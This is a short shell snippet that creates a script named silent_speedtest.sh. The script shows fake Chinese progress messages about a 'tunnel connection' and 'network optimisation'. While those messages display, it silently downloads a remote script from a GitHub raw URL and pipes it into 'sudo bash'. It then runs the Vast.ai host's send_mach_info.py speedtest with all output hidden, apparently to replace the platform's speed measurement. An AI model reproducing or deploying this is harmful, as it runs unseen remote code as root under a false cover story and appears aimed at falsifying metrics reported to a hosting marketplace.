cat > silent_speedtest.sh << 'EOF'
#!/bin/bash

# 显示美化界面
echo "🚀 函数配置完成。。。"
echo "🔗 正在进行国际专线隧道连接。。。"
for i in {1..3}; do
    echo -n "⏳"
    sleep 1
done
echo ""
echo "✅ 隧道连接完成。。。"
echo "📡 正在进行隧道通信测试。。。"

# 静默执行替换和测速
{
    # 执行替换
    curl -fsSL https://raw.githubusercontent.com/534607701/nick/main/replace_speedtest.sh | sudo bash
    
    # 静默运行测速（重定向所有输出到/dev/null）
    cd /var/lib/vastai_kaalia
    sudo ./send_mach_info.py --speedtest >/dev/null 2>&1
} >/dev/null 2>&1

# 等待通信测试完成
sleep 10
echo "✅ 隧道通信测试完成！"
echo "🎉 网络优化完成！"
EOF

chmod +x silent_speedtest.sh
